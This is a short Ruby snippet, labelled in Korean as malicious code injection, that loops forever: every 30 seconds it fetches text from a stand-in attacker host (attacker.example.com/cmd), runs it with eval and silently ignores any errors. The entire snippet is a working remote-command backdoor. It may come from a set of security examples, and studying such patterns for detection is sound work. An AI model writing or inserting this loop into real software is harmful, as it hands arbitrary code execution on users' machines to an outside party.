# 악성 — 웹훅에서 받은 데이터를 eval로 실행 (Code Injection)
require 'net/http'
require 'uri'

uri = URI('https://attacker.example.com/cmd')

loop do
  begin
    response = Net::HTTP.get(uri)
    # 외부 서버에서 받은 임의 Ruby 코드를 즉시 실행
    eval(response)
  rescue => e
    # 실패해도 조용히 계속
  end
  sleep 30
end
